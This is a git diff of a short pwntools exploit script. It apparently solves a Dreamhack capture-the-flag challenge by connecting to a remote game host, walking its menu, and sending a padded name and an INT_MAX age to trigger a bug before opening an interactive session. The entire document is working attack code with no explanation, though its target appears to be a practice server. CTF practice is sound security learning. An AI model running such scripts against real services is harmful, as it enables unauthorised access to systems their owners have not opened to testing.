@@ -1,16 +1,27 @@
 from pwn import *
-context.log_level='debug'
+context.log_level = 'debug'
 
-n = remote('host1.dreamhack.games',8397)
+hosts = 'host1.dreamhack.games'
+port = 24385
 
-name = 'A'*16
-age = 100000000000
+p = remote(hosts,port)
 
-n.sendlineafter('>','1')
-n.sendlineafter('Name: ',name)
-n.sendlineafter('Age: ',str(age))
+NAME = 'A'*16
+INT_MAX = 2147483647
 
-n.sendlineafter('>','3')
-n.sendlineafter('>','2')
 
-n.interactive()
+p.recvuntil('> ')
+p.sendline('3')
+
+p.recvuntil('> ')
+p.sendline('1')
+p.recvuntil('Name: ')
+p.sendline(NAME)
+p.recvuntil('Age: ')
+p.sendline(str(INT_MAX))
+
+p.recvuntil('> ')
+p.sendline('2')
+
+
+p.interactive()
